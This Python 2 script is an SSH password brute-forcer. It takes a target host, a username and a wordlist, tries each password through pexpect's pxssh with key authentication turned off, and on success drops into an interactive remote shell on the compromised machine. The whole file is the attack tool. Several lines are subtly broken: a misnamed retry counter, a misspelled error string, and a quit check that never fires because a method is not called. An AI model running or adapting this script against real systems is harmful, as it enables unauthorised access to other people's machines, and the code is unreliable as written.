
from pexpect import pxssh
import time
import sys


def connect(host, user, password):
    fails =0

    try:
        s = pxssh.pxssh()
        s.force_password= True                   # Don't go for private-public key verification, ask for password
        s.login(host, user, password)
        print 'Password found ' + password
        return s

    except Exception, e:
        if fails > 5:
            print 'Too many socket timeouts '
            exit(0)

        elif 'read_nonblocking' in str(e):
            fail += 1
            time.sleep(5)
            return connect(host, user, password)

        elif 'synchronizw with original prompt' in str(e):
            time.sleep(1)
            return connect(host, user, password)
        return None


def main():

    host = sys.argv[1]
    user = sys.argv[2]
    dt = sys.argv[3]

    if dt:
        with open(dt, 'r') as infile:
            for line in infile:
                password = line.strip('\r\n')
                print 'Testing -> ' + str(password)
                con = connect(host, user, password)
                if con:
                    print '[SSH connected, Issue commands Q or q for quiting!]'
                    command = raw_input('>')
                    while command.lower != 'q':
                        con.sendline(command)
                        con.prompt()
                        print con.before
                        command = raw_input('>')
    else:
        print "No dict found. Error"
        exit(0)

if __name__ == '__main__':
    main()












